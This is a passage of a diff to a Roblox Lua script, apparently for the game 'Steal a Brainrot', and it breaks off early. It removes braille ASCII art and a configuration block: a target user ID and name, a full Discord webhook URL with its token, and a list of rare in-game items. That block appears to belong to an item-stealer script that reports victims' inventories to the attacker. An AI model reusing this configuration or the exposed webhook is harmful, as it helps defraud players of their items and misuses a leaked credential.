-⣯⢿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠈⠀⡀⠀⠀⢻⡀⠄⢁⠐⠈⠄⡀⠂⢁⠀⡀⠀⠠⠀
-⣿⢯⣿⢿⣟⡿⣿⢯⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀⠄⠀⠐⠀⠘⣷⠈⠀⠄⠡⠀⠄⢁⠠⠀⠀⠄⡁⠄
-⡿⣯⢟⡻⢮⣷⣻⢿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⢀⠈⠀⠄⠀⠘⣧⠈⢀⠂⠁⡀⠂⢀⠠⠁⡐⠠⢈
-⢟⣬⢳⣛⡿⣼⣳⣟⡿⣾⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡖⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠄⠀⠂⠀⠘⣧⡀⠐⠀⠠⠐⠠⠐⠠⢀⡑⢂
-⡞⣼⢣⣟⣼⣳⣟⡾⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⡛⣿⣿⣿⣟⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠂⠀⠂⠀⠈⢷⡄⠈⡄⠡⢂⡁⠆⢠⠐⢂
-⡝⣎⡟⡼⣖⣻⣼⣻⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢁⣴⣿⣿⣿⣿⣿⡿⣿⣶⣌⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠁⡀⠂⠀⠀⠻⣆⠰⢁⠂⡐⡈⠄⠌⡄
-⡝⣮⢝⣳⡽⣳⢯⣷⣻⣽⣻⣽⢿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⣿⣿⣿⣿⣿⡼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣴⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣆⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠈⠀⠀⠄⠂⠀⠀⠙⣷⡠⠑⡐⠤⢉⠰⢀
-⣝⢶⣫⢷⡻⣭⢻⣼⣳⣟⣯⢿⡟⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢻⣿⣿⣿⣿⠇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣾⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣟⡆⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠁⠠⠀⢀⠁⠠⠀⠈⢳⣅⠂⠒⣈⠐⢂
-⣎⢷⡹⢎⡷⣹⢏⣶⡻⣞⣽⣳⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣽⣟⣿⣿⣿⡌⣿⣿⣿⢟⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣼⣿⣿⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⡷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂⠀⠀⠠⠀⠐⠀⠠⠀⠐⠀⠀⠹⣮⠁⡄⢊⠄
-⡚⢦⡝⣎⡳⣝⢾⡱⣏⣾⢷⣻⣽⣷⡿⣿⢿⣻⣾⢿⣿⡿⣟⣾⣿⣿⣿⠿⣘⣯⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢱⣿⣿⣿⣿⣯⣵⣿⣿⣿⣿⣿⣿⣿⢷⣫⠇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠐⠀⠠⠐⠀⠈⢀⠀⠘⣷⣀⠣⢈
-⡹⢦⡙⢦⡝⡼⢶⣻⡽⣯⣟⣯⢷⣯⢿⡽⣯⣷⣯⣿⣿⡿⠿⣛⣭⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡽⣯⢷⡐⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠁⢀⠈⠀⠄⠈⢀⠀⠠⠀⠈⢷⡌⢂
-⡱⢣⠝⣦⢻⡝⣯⢗⣻⡵⡾⣭⠷⣞⡿⣽⣷⡿⢟⣫⣵⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢿⣿⣿⣿⣿⣿⣿⣟⣯⣿⡿⣟⡿⣯⢿⡽⣞⡅⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠂⠀⠐⠀⠠⠀⠐⠀⠈⢿⡆
-⡱⣋⢾⡡⡟⣼⢣⡟⣶⣙⢷⣫⢿⣹⡿⢛⣩⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡘⢷⢯⣟⡾⣽⢯⣻⣽⣳⢿⣹⡽⣞⢧⡻⡜⢠⣿⡿⢟⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣯⣝⡻⢿⣿⡿⣣⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠈⠀⡀⠁⠀⠂⠀⠄⠁⠠⠀⠀⢿
-⡱⡍⣖⢣⡝⡶⣋⢾⡱⣞⢧⣻⡾⣋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢠⣦⡙⠪⢽⢳⢯⣳⢳⣏⢾⣣⠟⠼⠃⣡⡄⢈⣩⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣍⡱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠁⡀⠁⠀⠂⢀⠐⠀⠈
-⡱⡜⣬⢣⣝⡲⣝⢮⣟⣼⡿⢋⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢁⣿⣿⣿⣿⣶⣦⣤⣭⣁⣬⣤⣤⣶⡶⠛⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠂⢀⠀⠁⡀⠂⠀⠄⠀
-⡱⣚⠴⣋⢶⡱⣎⢷⣾⠏⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⡀⠀⠂⠀⠐⠀⡀⠂
-⡱⢎⡽⣩⢞⡱⢭⣾⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⠀⠄⠁⠈⠀⠄⠀⡀
-⡱⢎⠶⡱⢎⣵⡿⢡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⣿⣿⣿⣿⣿⣿⣿⣿⠟⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⠠⠀⠀⠠⠈⠀⠂⠀⠄⠀
-⢳⡞⢇⠷⣞⣾⠇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⡟⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⢟⣛⠇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠄⠁⢀⠠⠀
-⢣⢜⡾⢛⣫⡍⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⣿⣿⣿⣿⡏⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢺⣿⣇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠐⠀⠀⠂⠀⠄⠀⡀⠄
-⢌⢺⡇⣿⣿⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣻⣿⣆⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠁⠠⠀⢀⠀
-⠌⠚⢷⣙⠇⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⢁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢻⣿⣌⢿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠈⠀⢀⠈⠀⠄⠐⠀⡀
-⠀⠌⢠⣿⢢⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣿⣿⣿⡟⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢿⣿⣆⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠄⠀⠀⠂⠀⠄⠂⠀
-⠠⠈⢼⡇⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡼⣿⣿⣇⠻⢿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠂⠀⠁⠠⠀⠁
-⠀⠡⢸⡇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢿⣿⣿⢸⣦⣉⠻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠂⠀⢀⠈⠀⠀⡀⠈⢀⠐⠀⠁
-⠀⠁⣼⠏⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣸⣿⣿⣿⡅⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⢸⣿⣿⣷⡈⢿⠀⠀⠀⠀⠀⠐⠀⠀⠀⡀⠀⠀⠂⠀⠐⠀⠠⠈⠀
-⠀⠂⢽⡄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⠘⣿⣿⣿⣿⣆⠀⠀⠀⠀⠠⠀⠀⠀⢀⠀⠀⠁⠀⠐⠀⠈⡀⠄⠁
-⠀⠀⠈⠻⢦⣭⡁⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣼⣿⣿⣿⣿⣧⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⡇⢿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠂⠁⠠⠈⢀⠀⠄⠂
-⠀⠀⢀⢀⣤⠞⣫⣶⣌⣉⠛⣛⣛⣛⣩⣍⣩⣉⣍⣉⣛⣛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣸⣿⣿⣿⣿⣿⣿⡄⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣸⣿⣿⡇⢸⣿⣿⣿⣿⣿⠀⠀⠀⠂⠀⠁⠀⢀⠈⠀⠄⠂⢀⠐⠀⠠⠀⠄
-⠀⢀⣴⢟⣱⣾⣿⣿⣿⣿⣌⡻⠿⠿⠿⠿⠿⢿⣛⣛⣛⣋⣁⣛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣰⣿⣿⣿⣿⣿⣿⣿⣷⡀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢿⢣⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⢀⠠⠀⠀⠄⠀⠠⠀⠠⠈⠀⠄⠀
-⣴⢟⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡘⢿⣿⣿⣿⣿⠿⠿⠿⢛⣛⣋⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⢸⣿⢿⣿⣿⣿⣿⣿⣿⣿⣷⡈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⣾⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⠀⠀⠀⠀⠁⠀⠀⠀⠄⠀⠈⢀⠀⠁⠀⠁⠀⠂
-⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠰⣶⣶⣿⣿⠿⢛⣋⣥⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣠⠆⢸⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢸⣿⣿⣿⣿⡏⣼⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⣀⣀⣀⣤⣤⣤⣤⣴⣶⣶⣶⣾⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⡀⠒⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⣁⡴⣾⡽⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣿⣿⣿⣿⡟⡰⠿⠛⣛⣉⣭⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⣦⣤⣌⣉⣉⢉⠉⡉⣉⣉⣁⡤⣤⢖⣯⢳⣛⣧⢿⣇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣌⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⠿⢡⣾⣿⣿⡿⢋⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣷⡿⣽⣯⢿⣻⣽⣳⢯⣞⣷⣻⢮⡷⣯⣟⣾⣻⢮⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣷⣤⡈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣍⠛⠯⠿⠽⣟⡿⣽⠿⠾⠋⣡⣶⣿⡿⠟⣉⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠾⠛⠷⠛⠙⠛⠚⠓⠛⠋⠛⠓⠛⠚⠙⠛⣀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣶⢦⣀⠉⠛⠻⠿⢿⣮⣭⣉⠉⠉⠩⠍⣉⠀⠤⠶⠶⠶⠶⠦⠤⠤⠶⠶⠟⣛⣛⣩⣴⣾⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣛⣯⣭⣭⣤⣴⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⢶⣦⣤⣤⣀⣈⣉⣉⣀⣀⣀⣤⢤⡤⢤⡤⢶⡖⣾⠻⡽⣟⢿⡻⣯⢿⢿⡿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local VirtualInputManager = Instance.new("VirtualInputManager")
+local Stats = game:GetService("Stats")
+local TweenService = game:GetService("TweenService")
 
-local TARGET_ID = 5262231688
-local TARGET_USER = "Lov3gore9999"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1552138536902201402/EwnQj2HoVJAxaOO9S3wYcCGm31jXeHMMuQi1-nVgLvhMULcEEYvbteOEWwBCRn8Yj_sS"
+local player = Players.LocalPlayer
+local lp = player
+local playerGui = player:WaitForChild("PlayerGui")
 
-local TargetBrainrots = {
-    ["Strawberry Elephant"] = true,
-    ["Meowl"] = true,
-    ["Skibidi Toilet"] = true,
-    ["Los Dragons"] = true,
